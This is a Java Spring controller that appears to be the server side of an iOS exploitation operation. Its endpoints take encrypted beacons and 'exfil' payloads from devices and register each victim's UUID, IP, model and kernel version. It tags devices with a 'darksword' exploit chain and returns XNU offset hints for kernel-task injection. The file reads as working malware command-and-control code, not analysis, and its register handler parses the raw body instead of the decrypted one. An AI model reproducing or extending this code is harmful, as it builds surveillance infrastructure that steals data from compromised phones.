package com.device.service.impl;

import java.nio.charset.StandardCharsets;
import java.util.LinkedHashMap;
import java.util.Map;

import javax.servlet.http.HttpServletRequest;

import org.springframework.beans.factory.annotation.Value;
import org.springframework.http.HttpStatus;
import org.springframework.http.MediaType;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.RestController;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.device.dto.DeaconBody;
import com.device.entity.DeviceEntity;
import com.device.entity.Ios18ParamEntity;
import com.device.response.ApiResponse;
import com.device.service.ApiService;
import com.device.util.ClientInfoUtils;
import com.device.util.ExfilCrypto;
import com.device.util.HttpRequestUtils;
import com.device.util.IpUtil;
import com.device.util.RequestGuardUtil;

import lombok.extern.slf4j.Slf4j;


@Slf4j
@RestController
public class ApiServiceImpl implements ApiService {

    private static final String[] UUID_KEYS_A = {"lhu", "uuid", "device_uuid", "deviceUUID"};

    private final IpUtil ipUtil;
    private final DeviceAsyncWriter asyncWriter;

    @Value("${lab.enc.password:}")
    private String encPassword;

    @Value("${lab.enc.salt:}")
    private String encSalt;

    /** true：/api/device/register 预注册写库；false：仅返回正常 JSON，不建机 */
    @Value("${device.register-enabled:false}")
    private boolean registerEnabled;

    public ApiServiceImpl(IpUtil ipUtil, DeviceAsyncWriter asyncWriter) {
        this.ipUtil = ipUtil;
        this.asyncWriter = asyncWriter;
    }

    /** 解密上行 AES-CTR 信封（C2_API.md §5）；明文 body 原样返回。 */
    private String decryptBody(String body) {
        return ExfilCrypto.maybeDecryptExfilBody(body, encPassword, encSalt);
    }

    // ==================== §2.1 POST /api/device/register ====================

    @Override
    public ResponseEntity<String> postDeviceRegister(HttpServletRequest request) {
        String clientIp = ipUtil.getClientIp(request);
        String domain = HttpRequestUtils.resolveDomain(request);
        String rawBody = HttpRequestUtils.readBody(request);
        // 解密 AES-CTR 信封（C2_API.md §5）
        String body = decryptBody(rawBody);
        if (body == null || body.isEmpty()) {
            return badRequest("empty body");
        }
        JSONObject json;
        try {
            Object obj = JSON.parse(rawBody);
            if (!(obj instanceof JSONObject)) {
                return badRequest("body is not a JSON object");
            }
            json = (JSONObject) obj;
        } catch (Exception e) {
            return badRequest("invalid JSON: " + e.getMessage());
        }

        String deviceUUID = trim(json.getString("deviceUUID"));
        String channelCode = trim(json.getString("channelCode"));
        String chain = trim(json.getString("chain"));
        String iosVersion = pickFirstTrim(
                json.getString("ios"), json.getString("ios_version"));
        // ---- 业务逻辑（可关：仅 ACK，不预注册写库）----
        if (registerEnabled) {
            double now = System.currentTimeMillis() / 1000.0;
            DeviceEntity newDevice = new DeviceEntity();
            newDevice.setDeviceId(deviceUUID);
            newDevice.setDevice_id(deviceUUID);
            newDevice.setChannelCode(channelCode);
            newDevice.setDomain(domain);
            newDevice.setIp(clientIp);
            newDevice.setIosVersion(iosVersion == null ? "" : iosVersion);
            newDevice.setBindPhase(0);
            newDevice.setDevicestatus(0);
            newDevice.setOnlinestatus(0);
            newDevice.setC2Series(1);
            newDevice.setAddtime(now);
            newDevice.setIpstatus(0);
            newDevice.setLastEventAt(now);
            newDevice.setDeviceName("");
            newDevice.setModel("");
            asyncWriter.addDevice(newDevice);
        } else {
            log.debug("/api/device/register 业务已关闭，仅响应 uuid={} ip={}", deviceUUID, clientIp);
        }

        // ---- 响应构造 ----
        String targetChain = chain == null ? "" : chain;
        String targetChainLabel = buildChainLabel(chain);
        String xnu = computeXnu(iosVersion);
        Map<String, Object> resp = new LinkedHashMap<>();
        resp.put("ok", true);
        resp.put("device", deviceUUID);
        resp.put("device_id", deviceUUID);
        resp.put("aliased", false);
        resp.put("ios_version", iosVersion == null ? "" : iosVersion);
        resp.put("target_chain", targetChain);
        resp.put("target_chain_label", targetChainLabel);
        Map<String, Object> offset = new LinkedHashMap<>();
        offset.put("ok", true);
        offset.put("mode", "probing");
        offset.put("device", null);
        offset.put("xnu", xnu);
        offset.put("build", null);
        offset.put("candidates", new Object[0]);
        offset.put("hint", "device model required (iPhoneN,M); refuse xnu-only kernelTask inject");
        resp.put("offset_params", offset);
        resp.put("sla_ms", 15000);
        resp.put("s5_honest", "");

        return ResponseEntity.ok()
                .contentType(MediaType.APPLICATION_JSON)
                .body(JSON.toJSONString(resp));
    }
    
    @Override
    public ResponseEntity<String> postEvent(HttpServletRequest request) {
        String body = decryptBody(HttpRequestUtils.readBody(request));
        if (!RequestGuardUtil.isJsonObjectBody(body)) {
            log.debug("event 丢弃非 JSON body ip={}", ipUtil.getClientIp(request));
            return ackText("0\ncfgVer=");
        }
        dispatchCapture(request, body, "event", "状态上报", "03_状态上报", false);
        return ackText("0\ncfgVer=");
    }


    // ==================== 心跳检测（原 18-beacon-server） ====================

    @Override
    public ResponseEntity<String> health(HttpServletRequest request) {
        return ResponseEntity.ok()
                .contentType(MediaType.TEXT_PLAIN)
                .body("pong");
    }

    @Override
    public ResponseEntity<String> getBeacon(HttpServletRequest request) {
        return ResponseEntity.status(HttpStatus.NOT_FOUND)
                .contentType(MediaType.TEXT_PLAIN)
                .body("Not Found");
    }

    @Override
    public ApiResponse beaconPost(HttpServletRequest request) {
        return handleBeacon(request, "beacon");
    }

    @Override
    public ApiResponse apiBeaconPost(HttpServletRequest request) {
        return handleBeacon(request, "api/beacon");
    }

    /**
     * /beacon 主流程：读 body → 解密信封 → 解析 → 异步派发 → 立即返回 ACK。
     *
     * <p>异常吞掉，仍返回固定 ACK（接口文档 ACK-first）。
     */
    private ApiResponse handleBeacon(HttpServletRequest request, String path) {
        String clientIp = ipUtil.getClientIp(request);
        String domain = ClientInfoUtils.getClientDomainTwo(request);
        try {
            String rawBody = HttpRequestUtils.readBody(request);
            String body = ExfilCrypto.maybeDecryptExfilBody(rawBody, encPassword, encSalt);
            if (body == null || body.isEmpty()) {
                log.info("beacon body empty ip={} path={}", clientIp, path);
                return new ApiResponse(clientIp);
            }
            DeaconBody deaconBody = JSONObject.parseObject(body, DeaconBody.class);
            if (deaconBody == null || deaconBody.getUuid() == null || deaconBody.getUuid().isEmpty()) {
                log.info("beacon uuid empty ip={} path={}", clientIp, path);
                return new ApiResponse(clientIp);
            }
            // 不写 ios18param；仅限流更新 device 在线状态
            asyncWriter.beaconAddDevice(deaconBody.getUuid(), domain, clientIp, deaconBody);
            return new ApiResponse(clientIp);
        } catch (Exception e) {
            log.info("beacon handle err ip={} path={} err={}", clientIp, path, e.toString(), e);
        }
        return new ApiResponse(clientIp);
    }


    // ==================== §3.2 /a 设备绑定 ====================
    @Override
    public ResponseEntity<String> postA(HttpServletRequest request) {
        String clientIp = ipUtil.getClientIp(request);
        try {
            String body = decryptBody(HttpRequestUtils.readBody(request));
            String lhu = extractLhu(body);
            if (lhu == null || lhu.isEmpty()) {
                log.warn("a bind warn: missing lhu ip={}", clientIp);
                return ackText("0");
            }
            if (!RequestGuardUtil.isJsonObjectBody(body)) {
                log.info("a 丢弃非 JSON body ip={} lhu={}", clientIp, lhu);
                return ackText("0");
            }
            //iOS8param写入
            dispatchCapture(request, body, "a", "设备注册", "01_设备注册", false);

            JSONObject json = parseJsonObject(body);
            String model = null, deviceName = null, iosVersion = null;
            String buildVersion = null, hostname = null, sysname = null;
            String release = null, kernelVersion = null, source = null;
            if (json != null) {
                model = trim(json.getString("machine"));
                deviceName = trim(json.getString("deviceName"));
                iosVersion = trim(json.getString("ios_version"));
                buildVersion = trim(json.getString("build_version"));
                hostname = trim(json.getString("hostname"));
                sysname = trim(json.getString("sysname"));
                release = trim(json.getString("release"));
                kernelVersion = trim(json.getString("kern_version"));
                source = trim(json.getString("source"));
            }
            // device 异步处理（域名用于 channelcode 兜底：qudao.c2_domain）
            String domain = HttpRequestUtils.resolveDomain(request);
            asyncWriter.bindOrInsertFromA(lhu, domain, clientIp, model, deviceName, iosVersion,
                    buildVersion, hostname, sysname, release, kernelVersion, source);

            return ackText("0");
        } catch (Exception e) {
            log.error("/a设备更新失败 ip={} path={} err={}", clientIp, request.getRequestURI(), e.toString(), e);
            return ackText("0");
        }
    }

    @Override
    public ResponseEntity<String> getA(HttpServletRequest request) {
        return ResponseEntity.ok()
                .contentType(MediaType.TEXT_PLAIN)
                .body("-1");
    }


    @Override
    public ResponseEntity<String> handleOptionsKnown(HttpServletRequest request) {
        return ResponseEntity.noContent().build();
    }

    // ==================== §4 兜底 capture_unimplemented ====================

    @Override
    public ResponseEntity<String> captureUnimplemented(HttpServletRequest request) {
        log.debug("drop unimplemented path={} ip={}", request.getRequestURI(), ipUtil.getClientIp(request));
        return ResponseEntity.status(HttpStatus.NOT_FOUND)
                .contentType(MediaType.TEXT_PLAIN)
                .body("Not Found");
    }

    @Override
    public ResponseEntity<String> handleOptionsAll(HttpServletRequest request) {
        return ResponseEntity.noContent().build();
    }

    // ==================== 内部：通用 capture 派发 ====================

    /**
     * 通用 capture 派发：读 body → 组装 Ios18ParamEntity → 异步
     * {@link DeviceAsyncWriter#capture(Ios18ParamEntity, boolean)}。
     *
     * @param request      HTTP 请求
     * @param bodyNullable 已读好的 body（null 时本方法内再读一次）
     * @param kind         归一 kind
     * @param category     分类名
     * @param categoryDir  分类目录
     * @param skipStore    /log /p 类 skip_store（此处 device-server 无此类接口，保留参数对齐）
     */
    private void dispatchCapture(HttpServletRequest request, String bodyNullable,
                                 String kind, String category, String categoryDir,
                                 boolean skipStore) {
        String clientIp = ipUtil.getClientIp(request);
        try {
            String body = (bodyNullable != null) ? bodyNullable : HttpRequestUtils.readBody(request);
            body = decryptBody(body);
            if (!RequestGuardUtil.isJsonObjectBody(body)) {
                log.debug("dispatchCapture 丢弃非 JSON body kind={} ip={} path={}", kind, clientIp, request.getRequestURI());
                return;
            }
            String headersJson = HttpRequestUtils.toHeadersJson(request);
            String path = request.getRequestURI();
            String method = request.getMethod();

            String uuid = extractUuidGeneric(body);
            String tt = extractField(body, "tt");
            String source = extractField(body, "source");
            byte[] bodyBytes = (body == null) ? new byte[0] : body.getBytes(StandardCharsets.UTF_8);
            int bodyLen = bodyBytes.length;

            boolean emptyBody = bodyLen == 0;
            boolean isUnimplemented = "unimplemented".equals(kind);

            boolean skipRedis;
            String storage;
            String bodyToStore = body == null ? "" : body;

            if (skipStore || (emptyBody && !isUnimplemented)) {
                storage = "skip";
                skipRedis = true;
            } else {
                storage = "inline";
                skipRedis = true; 
            }

            Ios18ParamEntity entity = new Ios18ParamEntity();
            entity.setKind(kind);
            entity.setMethod(method);
            entity.setClientIp(clientIp);
            entity.setPath(path);
            entity.setHeaders(headersJson);
            entity.setBody(bodyToStore);
            entity.setRemark("");
            entity.setDeviceId(uuid);
            entity.setLhu(uuid);
            entity.setCategory(category);
            entity.setCategoryDir(categoryDir);
            entity.setBodyBytes(bodyLen);
            entity.setStorage(storage);
            entity.setFilePath("");
            entity.setUnpackPath("");
            entity.setCiResult("");
            entity.setTt(tt);
            entity.setSource(source);
            entity.setSeq(0L);
            entity.setUnimplemented(isUnimplemented ? 1 : 0);
            entity.setAddtime(System.currentTimeMillis() / 1000.0);

            asyncWriter.capture(entity, skipRedis);
        } catch (Exception e) {
            log.error("dispatchCapture FAIL kind={} ip={} path={} err={}",
                    kind, clientIp, request.getRequestURI(), e.toString(), e);
        }
    }

    // ==================== 内部：/register 辅助 ====================

  
    private static String buildChainLabel(String chain) {
        if (chain == null || chain.isEmpty()) {
            return "";
        }
        if ("darksword".equalsIgnoreCase(chain)) {
            return "D鏈";
        }
        return chain;
    }

    /**
     * xnu 粗算：iOS major+6 + minor（接口文档 §2.1）。
     * 例：18.5 → 24.5；16 → 22；17.4.1 → 23.4.1
     */
    private static String computeXnu(String iosVersion) {
        if (iosVersion == null || iosVersion.isEmpty()) {
            return "";
        }
        String[] parts = iosVersion.split("\\.", 2);
        try {
            int major = Integer.parseInt(parts[0]);
            int xnuMajor = major + 6;
            if (parts.length == 1) {
                return String.valueOf(xnuMajor);
            }
            return xnuMajor + "." + parts[1];
        } catch (NumberFormatException e) {
            return "";
        }
    }

    // ==================== 内部：/a 辅助 ====================

    private static String extractLhu(String body) {
        JSONObject json = parseJsonObject(body);
        if (json == null) {
            return null;
        }
        for (String key : UUID_KEYS_A) {
            String v = json.getString(key);
            if (v != null && !v.isEmpty()) {
                return v;
            }
        }
        return null;
    }

    // ==================== 内部：通用 ====================

    private static String extractUuidGeneric(String body) {
        JSONObject json = parseJsonObject(body);
        if (json == null) {
            return null;
        }
        String[] keys = {"uuid", "lhu", "device_uuid", "deviceUUID"};
        for (String key : keys) {
            String v = json.getString(key);
            if (v != null && !v.isEmpty()) {
                return v;
            }
        }
        return null;
    }

    private static String extractField(String body, String key) {
        JSONObject json = parseJsonObject(body);
        if (json == null) {
            return "";
        }
        String v = json.getString(key);
        return (v == null) ? "" : v;
    }

    private static JSONObject parseJsonObject(String body) {
        if (body == null || body.isEmpty()) {
            return null;
        }
        try {
            Object obj = JSON.parse(body);
            if (obj instanceof JSONObject) {
                return (JSONObject) obj;
            }
        } catch (Exception ignore) {
        }
        return null;
    }

    private static String trim(String s) {
        return (s == null) ? null : s.trim();
    }

    /** 取第一个非空 trim 后的值（用于 ios/ios_version、user_agent/userAgent 归一） */
    private static String pickFirstTrim(String a, String b) {
        String v = trim(a);
        if (v != null && !v.isEmpty()) {
            return v;
        }
        return trim(b);
    }

    // ==================== 内部：响应构造 ====================

    private static ResponseEntity<String> ackText(String body) {
        return ResponseEntity.ok()
                .contentType(MediaType.TEXT_PLAIN)
                .body(body);
    }

    private static ResponseEntity<String> badRequest(String msg) {
        return ResponseEntity.status(HttpStatus.BAD_REQUEST)
                .contentType(MediaType.TEXT_PLAIN)
                .body(msg == null ? "bad request" : msg);
    }


}
